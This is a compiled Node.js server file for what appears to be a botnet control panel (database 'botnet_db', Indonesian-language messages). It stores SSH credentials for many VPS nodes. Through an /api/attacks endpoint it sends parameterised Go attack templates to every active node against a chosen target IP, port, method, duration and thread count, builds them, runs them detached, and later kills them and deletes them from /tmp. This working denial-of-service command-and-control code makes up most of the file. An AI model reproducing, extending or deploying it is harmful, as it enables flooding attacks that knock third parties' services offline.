var __create = Object.create;
var __defProp = Object.defineProperty;
var __getOwnPropDesc = Object.getOwnPropertyDescriptor;
var __getOwnPropNames = Object.getOwnPropertyNames;
var __getProtoOf = Object.getPrototypeOf;
var __hasOwnProp = Object.prototype.hasOwnProperty;
var __copyProps = (to, from, except, desc) => {
  if (from && typeof from === "object" || typeof from === "function") {
    for (let key of __getOwnPropNames(from))
      if (!__hasOwnProp.call(to, key) && key !== except)
        __defProp(to, key, { get: () => from[key], enumerable: !(desc = __getOwnPropDesc(from, key)) || desc.enumerable });
  }
  return to;
};
var __toESM = (mod, isNodeMode, target) => (target = mod != null ? __create(__getProtoOf(mod)) : {}, __copyProps(
  // If the importer is in node compatibility mode or this is not an ESM
  // file that has been converted to a CommonJS file using a Babel-
  // compatible transform (i.e. "__esModule" has not been set), then set
  // "default" to the CommonJS "module.exports" for node compatibility.
  isNodeMode || !mod || !mod.__esModule ? __defProp(target, "default", { value: mod, enumerable: true }) : target,
  mod
));

// server.ts
var import_express = __toESM(require("express"), 1);
var import_vite = require("vite");
var import_http = require("http");
var import_socket = require("socket.io");
var import_path = __toESM(require("path"), 1);
var import_promises = __toESM(require("fs/promises"), 1);

// src/lib/db.ts
var import_promise = __toESM(require("mysql2/promise"), 1);
var import_dotenv = __toESM(require("dotenv"), 1);
import_dotenv.default.config();
var db = import_promise.default.createPool({
  host: process.env.DB_HOST || "localhost",
  port: parseInt(process.env.DB_PORT || "3306"),
  user: process.env.DB_USER || "root",
  password: process.env.DB_PASSWORD || "",
  database: process.env.DB_NAME || "botnet_db",
  waitForConnections: true,
  connectionLimit: 10,
  queueLimit: 0,
  connectTimeout: 6e4,
  // 60 seconds
  enableKeepAlive: true,
  keepAliveInitialDelay: 1e4
});

// server.ts
var import_ssh2 = __toESM(require("ssh2"), 1);
var import_dotenv2 = __toESM(require("dotenv"), 1);
var import_crypto = __toESM(require("crypto"), 1);
var { Client, utils } = import_ssh2.default;
import_dotenv2.default.config();
var isProd = process.env.NODE_ENV === "production";
console.log(`[BOOT] Starting server in ${isProd ? "production" : "development"} mode...`);
async function startServer() {
  console.log("[BOOT] Initializing Express app...");
  const app = (0, import_express.default)();
  const httpServer = (0, import_http.createServer)(app);
  const io = new import_socket.Server(httpServer);
  const rawPort = process.env.PORT ? parseInt(process.env.PORT) : 3e3;
  const PORT = isNaN(rawPort) ? 3e3 : rawPort;
  console.log(`[BOOT] Configured PORT: ${PORT}`);
  const ATTACK_GO_PATH = isProd ? import_path.default.join(process.cwd(), "dist", "attack.go") : import_path.default.join(process.cwd(), "attack.go");
  const ATTACK2_GO_PATH = isProd ? import_path.default.join(process.cwd(), "dist", "attack2.go") : import_path.default.join(process.cwd(), "attack2.go");
  app.use(import_express.default.json());
  app.get("/api/health", async (req, res) => {
    try {
      await db.query("SELECT 1");
      res.json({ status: "ok", database: "connected" });
    } catch (error) {
      res.status(500).json({ status: "error", database: "disconnected" });
    }
  });
  app.get("/api/stats", async (req, res) => {
    try {
      let [rows] = await db.query("SELECT * FROM stats WHERE id = 1");
      if (rows.length === 0) {
        await db.query("INSERT IGNORE INTO stats (id, total_attacks, total_packets, total_bytes, total_time) VALUES (1, 0, 0, 0, 0)");
        [rows] = await db.query("SELECT * FROM stats WHERE id = 1");
      }
      const [serverStats] = await db.query(`
        SELECT 
          COUNT(*) as total,
          SUM(CASE WHEN status = 'active' THEN 1 ELSE 0 END) as active,
          SUM(CASE WHEN status = 'dead' THEN 1 ELSE 0 END) as dead,
          COALESCE(SUM(bandwidth), 0) as total_bw
        FROM servers
      `);
      const statsData = rows[0] || { total_attacks: 0, total_packets: 0, total_bytes: 0, total_time: 0 };
      res.json({ ...statsData, servers: serverStats[0] || { total: 0, active: 0, dead: 0, total_bw: 0 } });
    } catch (error) {
      console.error("Stats API Error:", error);
      res.status(500).json({ error: "Failed to fetch stats", details: error instanceof Error ? error.message : "Unknown error" });
    }
  });
  app.get("/api/servers", async (req, res) => {
    try {
      const [rows] = await db.query("SELECT id, host, port, username, auth_type, managed_key_id, cpu_cores, ram_mb, bandwidth, latency, status, last_checked FROM servers ORDER BY created_at DESC");
      res.json(rows);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch servers" });
    }
  });
  app.post("/api/servers", async (req, res) => {
    const { host, port, username, password, key_content, auth_type, managed_key_id } = req.body;
    try {
      const [result] = await db.query(
        "INSERT INTO servers (host, port, username, password, key_content, managed_key_id, auth_type) VALUES (?, ?, ?, ?, ?, ?, ?)",
        [host, port || 22, username, password || null, key_content || null, managed_key_id || null, auth_type]
      );
      res.json({ id: result.insertId, message: "Server added" });
    } catch (error) {
      res.status(500).json({ error: "Failed to add server" });
    }
  });
  app.delete("/api/servers/:id", async (req, res) => {
    try {
      await db.query("DELETE FROM servers WHERE id = ?", [req.params.id]);
      res.json({ message: "Server deleted" });
    } catch (error) {
      res.status(500).json({ error: "Failed to delete server" });
    }
  });
  app.get("/api/keys", async (req, res) => {
    try {
      const [rows] = await db.query("SELECT id, name, public_key, created_at FROM managed_keys ORDER BY created_at DESC");
      res.json(rows);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch managed keys" });
    }
  });
  app.post("/api/keys/generate", async (req, res) => {
    const { name } = req.body;
    try {
      const [existingKeys] = await db.query("SELECT id FROM managed_keys LIMIT 1");
      if (existingKeys.length > 0) {
        return res.status(400).json({ error: "Master Key sudah ada. Hanya diperbolehkan 1 kunci di OrbitCloud." });
      }
      const { privateKey: sshPrivateKey } = import_crypto.default.generateKeyPairSync("rsa", {
        modulusLength: 2048,
        privateKeyEncoding: {
          type: "pkcs1",
          format: "pem"
        }
      });
      const parsedKey = utils.parseKey(sshPrivateKey);
      if (parsedKey instanceof Error) throw parsedKey;
      const keyBuffer = parsedKey.getPublicSSH();
      const sshPublicKey = `ssh-rsa ${keyBuffer.toString("base64")} OrbitCloud-Key`;
      const [result] = await db.query(
        "INSERT INTO managed_keys (name, public_key, private_key) VALUES (?, ?, ?)",
        [name || `OrbitCloud Key`, sshPublicKey, sshPrivateKey]
      );
      res.json({ id: result.insertId, public_key: sshPublicKey });
    } catch (error) {
      console.error("Key generation failed:", error);
      res.status(500).json({ error: "Failed to generate key pair" });
    }
  });
  app.delete("/api/keys/:id", async (req, res) => {
    try {
      await db.query("DELETE FROM managed_keys WHERE id = ?", [req.params.id]);
      res.json({ message: "Key deleted" });
    } catch (error) {
      res.status(500).json({ error: "Failed to delete key" });
    }
  });
  app.post("/api/attacks", async (req, res) => {
    const { target_ip, target_port, method, duration, threads } = req.body;
    const safeTargetIP = target_ip.replace(/[^0-9.]/g, "");
    const safeTargetPort = parseInt(target_port) || 80;
    const safeDuration = parseInt(duration) || 60;
    const safeThreads = parseInt(threads) || 1e3;
    const safeMethod = method ? String(method).toUpperCase().trim() : "GOD";
    console.log(`[ATTACK_DEBUG] Target: ${safeTargetIP}, Method: ${safeMethod}, Threads: ${safeThreads}`);
    try {
      const [result] = await db.query(
        "INSERT INTO attack_logs (target_ip, target_port, method, duration, threads, status) VALUES (?, ?, ?, ?, ?, 'running')",
        [safeTargetIP, safeTargetPort, safeMethod, safeDuration, safeThreads]
      );
      const attackId = result.insertId;
      const [servers] = await db.query(`
        SELECT s.*, mk.private_key as managed_private_key 
        FROM servers s 
        LEFT JOIN managed_keys mk ON s.managed_key_id = mk.id 
        WHERE s.status = 'active'
      `);
      if (servers.length === 0) {
        await db.query("UPDATE attack_logs SET status = 'failed' WHERE id = ?", [attackId]);
        return res.status(400).json({ error: "No active servers available" });
      }
      const currentScriptPath = safeMethod.startsWith("V2-") || safeMethod.startsWith("V5-") || safeMethod.startsWith("V6-") || safeMethod.startsWith("V7-") || safeMethod.startsWith("V8-") || safeMethod.startsWith("V9-") || safeMethod.startsWith("V10-") ? ATTACK2_GO_PATH : ATTACK_GO_PATH;
      const attackScript = await import_promises.default.readFile(currentScriptPath, "utf8");
      const parameterizedScript = attackScript.split("{{.TargetIP}}").join(safeTargetIP).split("{{.TargetPort}}").join(safeTargetPort.toString()).split("{{.Duration}}").join(safeDuration.toString()).split("{{.Threads}}").join(safeThreads.toString()).split("{{.Method}}").join(safeMethod);
      let deployedCount = 0;
      for (const server of servers) {
        const conn = new Client();
        conn.on("ready", () => {
          const remotePath = `/tmp/stenly_${attackId}`;
          const goFile = `${remotePath}.go`;
          const binFile = remotePath;
          const deployCmd = `
            cat << 'EOF' > ${goFile}
${parameterizedScript}
EOF
            # Find Go
            GO_CMD="go"
            if ! command -v go >/dev/null 2>&1; then
              if [ -f /usr/local/go/bin/go ]; then
                GO_CMD="/usr/local/go/bin/go"
              elif [ -f /usr/bin/go ]; then
                GO_CMD="/usr/bin/go"
              fi
            fi

            $GO_CMD build -o ${binFile} ${goFile} && 
            chmod +x ${binFile} &&
            nohup nice -n -20 ${binFile} > ${remotePath}.log 2>&1 &
            echo $! > ${remotePath}.pid
          `;
          conn.exec(deployCmd, (err, stream) => {
            if (err) {
              io.emit("server_log", { id: server.id, message: `\u274C [DEPLO] Gagal deploy ke ${server.host}: ${err.message}` });
              return conn.end();
            }
            io.emit("server_log", { id: server.id, message: `\u2601\uFE0F [DEPLO] Menyiapkan script di ${server.host}...` });
            stream.on("close", () => {
              deployedCount++;
              db.query("UPDATE servers SET status = 'attacking' WHERE id = ?", [server.id]);
              io.emit("server_status_update", { id: server.id, status: "attacking" });
              io.emit("server_log", { id: server.id, message: `\u{1F525} [ATTACK] Serangan aktif di node ${server.host}!` });
              conn.end();
            });
            stream.stderr.on("data", (data) => {
              io.emit("server_log", { id: server.id, message: `\u26A0\uFE0F [ERROR] ${server.host}: ${data.toString()}` });
            });
          });
        }).on("error", (err) => {
          let msg = err.message;
          if (msg.includes("Authentication") || msg.includes("unauthorized")) msg = "Login Gagal: Password/Key Salah";
          else if (msg.includes("timeout")) msg = "Koneksi Timeout";
          else if (msg.includes("ECONNREFUSED")) msg = "Port 22 Tertutup";
          io.emit("server_log", { id: server.id, message: `\u274C [CONN] Gagal terhubung ke ${server.host}: ${msg}` });
        }).connect({
          host: server.host,
          port: server.port,
          username: server.username,
          password: server.auth_type === "password" ? server.password : void 0,
          privateKey: server.auth_type === "key" ? server.managed_private_key || server.key_content || void 0 : void 0,
          timeout: 2e4,
          readyTimeout: 3e4,
          keepaliveInterval: 1e4,
          keepaliveCountMax: 10
        });
      }
      await db.query("UPDATE stats SET total_attacks = total_attacks + 1 WHERE id = 1");
      const [newStats] = await db.query("SELECT * FROM stats WHERE id = 1");
      const [serverStats] = await db.query(`
        SELECT 
          COUNT(*) as total,
          COALESCE(SUM(CASE WHEN status = 'active' THEN 1 ELSE 0 END), 0) as active,
          COALESCE(SUM(CASE WHEN status = 'dead' THEN 1 ELSE 0 END), 0) as dead,
          COALESCE(SUM(bandwidth), 0) as total_bw
        FROM servers
      `);
      io.emit("stats_update", { ...newStats[0] || {}, servers: serverStats[0] });
      io.emit("attack_launched", { id: attackId, servers_deployed: servers.length });
      res.json({ id: attackId, message: "Attack launched", servers_deployed: servers.length });
      setTimeout(async () => {
        await db.query("UPDATE attack_logs SET status = 'completed' WHERE id = ?", [attackId]);
        await db.query("UPDATE servers SET status = 'active' WHERE status = 'attacking'");
        const [finalStats] = await db.query("SELECT * FROM stats WHERE id = 1");
        const [finalServerStats] = await db.query(`
          SELECT 
            COUNT(*) as total,
            COALESCE(SUM(CASE WHEN status = 'active' THEN 1 ELSE 0 END), 0) as active,
            COALESCE(SUM(CASE WHEN status = 'dead' THEN 1 ELSE 0 END), 0) as dead,
            COALESCE(SUM(bandwidth), 0) as total_bw
          FROM servers
        `);
        io.emit("stats_update", { ...finalStats[0] || {}, servers: finalServerStats[0] });
        for (const server of servers) {
          const conn = new Client();
          conn.on("ready", () => {
            conn.exec(`pkill -f stenly_${attackId} || true; rm -f /tmp/stenly_${attackId}*`, () => {
              conn.end();
            });
          }).connect({
            host: server.host,
            port: server.port,
            username: server.username,
            password: server.password || void 0,
            privateKey: server.managed_private_key || server.key_content || void 0,
            timeout: 5e3
          });
        }
        io.emit("attack_completed", { id: attackId });
      }, safeDuration * 1e3);
    } catch (error) {
      console.error("Attack failed:", error);
      res.status(500).json({ error: "Failed to launch attack" });
    }
  });
  app.get("/api/attacks", async (req, res) => {
    try {
      const [rows] = await db.query("SELECT * FROM attack_logs ORDER BY created_at DESC LIMIT 50");
      res.json(rows);
    } catch (error) {
      res.status(500).json({ error: "Failed to fetch attack logs" });
    }
  });
  app.post("/api/servers/test/:id", async (req, res) => {
    try {
      const [rows] = await db.query(`
        SELECT s.*, mk.private_key as managed_private_key 
        FROM servers s 
        LEFT JOIN managed_keys mk ON s.managed_key_id = mk.id 
        WHERE s.id = ?
      `, [req.params.id]);
      if (rows.length === 0) return res.status(404).json({ error: "Server not found" });
      const server = rows[0];
      await db.query("UPDATE servers SET status = 'testing' WHERE id = ?", [server.id]);
      io.emit("server_status_update", { id: server.id, status: "testing" });
      const conn = new Client();
      let watchdog = setTimeout(async () => {
        conn.end();
        if (!res.headersSent) {
          await db.query("UPDATE servers SET status = 'dead' WHERE id = ?", [server.id]);
          io.emit("server_status_update", { id: server.id, status: "dead" });
          io.emit("server_log", { id: server.id, message: "\u274C Koneksi Gagal: VPS tidak merespon SSH dalam 30 detik" });
          res.status(500).json({ error: "Test timeout" });
        }
      }, 3e4);
      conn.on("ready", () => {
        clearTimeout(watchdog);
        const executionWatchdog = setTimeout(async () => {
          conn.end();
          await db.query("UPDATE servers SET status = 'dead' WHERE id = ?", [server.id]);
          io.emit("server_status_update", { id: server.id, status: "dead" });
          io.emit("server_log", { id: server.id, message: "\u274C Timeout: Proses instalasi Go terlalu lama (>5 menit)" });
        }, 3e5);
        io.emit("server_log", { id: server.id, message: `\u2705 [CONN] SSH terhubung ke ${server.host}` });
        const testCmd = `
          # Function to log to stdout for socket.io
          log() { echo "STENLY_LOG: $1"; }

          log "Mengecek spesifikasi VPS..."
          NPROC=$(nproc)
          MEM=$(free -m | grep Mem | awk '{print $2}')
          echo "INFO_CPU: $NPROC"
          echo "INFO_MEM: $MEM"
          
          # Check for Go in common paths
          if [ -f "/usr/local/go/bin/go" ]; then ln -sf /usr/local/go/bin/go /usr/local/bin/go; fi

          echo "=== DEPENDENCIES ==="
          if ! command -v wget >/dev/null 2>&1 || ! command -v tar >/dev/null 2>&1; then
            log "Menginstall wget/tar..."
            if command -v apt-get >/dev/null 2>&1; then
              export DEBIAN_FRONTEND=noninteractive
              apt-get install -y -qq wget tar >/dev/null 2>&1 || (apt-get update -qq && apt-get install -y -qq wget tar >/dev/null 2>&1)
            fi
          fi

          echo "=== GO INSTALLATION ==="
          if command -v go >/dev/null 2>&1; then 
            log "Go sudah aktif: $(go version)"
          else 
            log "Go tidak ditemukan. Memulai instalasi (60MB)..."
            log "Harap tunggu, ini mungkin memakan waktu 1-3 menit..."
            cd /tmp
            wget -q https://go.dev/dl/go1.21.5.linux-amd64.tar.gz -O go.tar.gz || { log "Gagal mendownload Go!"; exit 1; }
            log "Mengekstrak Go Runtime..."
            rm -rf /usr/local/go && tar -C /usr/local -xzf go.tar.gz >/dev/null 2>&1
            rm -f go.tar.gz
            
            ln -sf /usr/local/go/bin/go /usr/local/bin/go
            ln -sf /usr/local/go/bin/gofmt /usr/local/bin/gofmt
            log "Go berhasil diinstall."
          fi

          log "Mengecek latensi..."
          echo "LATENCY: $(ping -c 1 8.8.8.8 | grep time= | awk -F'time=' '{print $2}' | awk '{print $1}')"
          
          pkill -f stenly_ || true
          log "Pengecekan selesai."
        `;
        conn.exec(testCmd, (err, stream) => {
          if (err) {
            clearTimeout(executionWatchdog);
            db.query("UPDATE servers SET status = 'dead' WHERE id = ?", [server.id]);
            io.emit("server_status_update", { id: server.id, status: "dead" });
            return res.status(500).json({ error: "SSH exec failed" });
          }
          let output = "";
          stream.on("data", (data) => {
            const str = data.toString();
            output += str;
            const logs = str.split("\n").filter((l) => l.startsWith("STENLY_LOG:"));
            logs.forEach((l) => {
              io.emit("server_log", { id: server.id, message: l.replace("STENLY_LOG: ", "") });
            });
          });
          stream.on("close", async () => {
            clearTimeout(executionWatchdog);
            const lines = output.trim().split("\n");
            const cpuLine = lines.find((l) => l.startsWith("INFO_CPU:"));
            const memLine = lines.find((l) => l.startsWith("INFO_MEM:"));
            const rawCpuValue = cpuLine?.split(":")[1];
            const rawRamValue = memLine?.split(":")[1];
            const rawCpu = rawCpuValue ? parseInt(rawCpuValue.trim()) : 1;
            const rawRam = rawRamValue ? parseInt(rawRamValue.trim()) : 512;
            const cpu = isNaN(rawCpu) ? 1 : rawCpu;
            const ram = isNaN(rawRam) ? 512 : rawRam;
            const hasGo = output.toLowerCase().includes("go version");
            const latencyLine = lines.find((l) => l.startsWith("LATENCY:"));
            const rawLatencyValue = latencyLine?.split(":")[1];
            const rawLatency = rawLatencyValue ? parseFloat(rawLatencyValue.trim()) : 0;
            const latency = isNaN(rawLatency) ? 0 : rawLatency;
            const status = hasGo ? "active" : "dead";
            await db.query(
              "UPDATE servers SET status = ?, cpu_cores = ?, ram_mb = ?, latency = ? WHERE id = ?",
              [status, cpu, ram, latency, server.id]
            );
            io.emit("server_status_update", { id: server.id, status, cpu_cores: cpu, ram_mb: ram, latency });
            conn.end();
            res.json({ message: "Test completed", status, cpu, ram, latency });
          });
        });
      }).on("error", async (err) => {
        clearTimeout(watchdog);
        await db.query("UPDATE servers SET status = 'dead' WHERE id = ?", [server.id]);
        io.emit("server_status_update", { id: server.id, status: "dead" });
        let msg = "Koneksi Gagal";
        const errStr = err.message.toLowerCase();
        if (errStr.includes("authentication") || errStr.includes("unauthorized")) msg = "Login Gagal: Password/Key Salah";
        else if (errStr.includes("timeout") || errStr.includes("etimedout")) msg = "Koneksi Timeout: Server Tidak Merespon (Check IP/Key)";
        else if (errStr.includes("connrefused") || errStr.includes("refused")) msg = "Koneksi Ditolak: Port 22 Tertutup";
        else msg = `Error: ${err.message}`;
        io.emit("server_log", { id: server.id, message: `\u274C ${msg}` });
        if (!res.headersSent) {
          res.status(500).json({ error: msg });
        }
      }).connect({
        host: server.host,
        port: server.port,
        username: server.username,
        password: server.auth_type === "password" ? server.password : void 0,
        privateKey: server.auth_type === "key" ? server.managed_private_key || server.key_content || void 0 : void 0,
        timeout: 2e4,
        readyTimeout: 3e4,
        keepaliveInterval: 1e4,
        keepaliveCountMax: 10
      });
    } catch (error) {
      res.status(500).json({ error: "Internal server error" });
    }
  });
  if (process.env.NODE_ENV !== "production") {
    console.log("[BOOT] Starting Vite Dev Server middleware...");
    const vite = await (0, import_vite.createServer)({
      server: { middlewareMode: true },
      appType: "spa"
    });
    console.log("[BOOT] Vite Dev Server middleware initialized.");
    app.use(vite.middlewares);
  } else {
    const distPath = import_path.default.join(process.cwd(), "dist");
    app.use(import_express.default.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(import_path.default.join(distPath, "index.html"));
    });
  }
  httpServer.listen(PORT, "0.0.0.0", async () => {
    console.log(`Server running on http://localhost:${PORT}`);
    let retries = 10;
    while (retries > 0) {
      try {
        await db.query("UPDATE servers SET status = 'dead' WHERE status = 'testing'");
        await db.query("UPDATE servers SET status = 'active' WHERE status = 'attacking'");
        console.log("Stuck server statuses reset.");
        break;
      } catch (e) {
        retries--;
        console.error(`Failed to reset statuses (Retrying ${retries} more times):`, e instanceof Error ? e.message : e);
        if (retries === 0) {
          console.error("Critical: Could not reset server statuses after multiple attempts.");
        } else {
          await new Promise((resolve) => setTimeout(resolve, 1e4));
        }
      }
    }
  });
}
startServer().catch((error) => {
  console.error("Critical error during server startup:", error);
  process.exit(1);
});
